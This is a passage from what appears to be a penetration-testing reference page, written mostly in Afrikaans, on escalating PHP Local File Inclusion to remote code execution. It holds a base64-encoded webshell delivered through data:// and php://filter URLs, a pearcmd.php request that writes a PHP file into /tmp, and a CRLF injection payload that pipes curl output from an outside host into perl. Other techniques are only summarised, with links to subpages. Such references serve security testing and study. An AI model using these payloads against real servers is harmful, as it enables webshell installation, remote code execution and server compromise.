http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (geen lêer nodig)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters** kan gebruik om enige inhoud as output te genereer. Dit beteken basies dat jy **enige php code** kan genereer vir die include **sonder om dit in 'n lêer te skryf**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** 'n lêer wat as **temporary** in `/tmp` gestoor word, veroorsaak dan in die **selfde request** 'n **segmentation fault**, en die **temporary file sal dan nie verwyder word nie** en jy kan daarna soek.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

As jy 'n **Local File Inclusion** gevind het en **Nginx** voor PHP loop, kan jy moontlik RCE verkry met die volgende tegniek:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

As jy 'n **Local File Inclusion** gevind het selfs al het jy **nie 'n session** nie en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data verskaf, sal PHP die **session vir jou aktiveer**. Jy kan dit misbruik om RCE te kry:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

As jy 'n **Local File Inclusion** gevind het en die bediener op **Windows** loop, kan jy moontlik RCE kry:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), die script `/usr/local/lib/phppearcmd.php` bestaan standaard in php docker images. Verder is dit moontlik om argumente aan die script via die URL deur te gee omdat aangedui word dat as 'n URL-param geen `=` het nie, dit as 'n argument gebruik moet word. Sien ook [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) en [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die volgende versoek skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Deur phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** met file_uploads = on openbaar maak, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Deur compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy **can exfiltrate the path** of the temp file, MAAR die **server** is **checking** of die **file to be included has PHP marks**, kan jy probeer om daardie **check** te **bypass** met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Deur eternal waiting + bruteforce

As jy die LFI kan misbruik om **upload temporary files** en die server die PHP-uitvoering laat **hang**, kan jy dan **brute force filenames during hours** om die temporary file te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Tot Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Jy moet dieselfde een 2 time include om daardie fout te gooi).

**Ek weet nie hoe dit nuttig is nie maar dit kan wees.**\
_Selfs al veroorsaak jy 'n PHP Fatal Error, PHP-tydelike lêers wat opgelaai is, word verwyder._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Verwysings

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
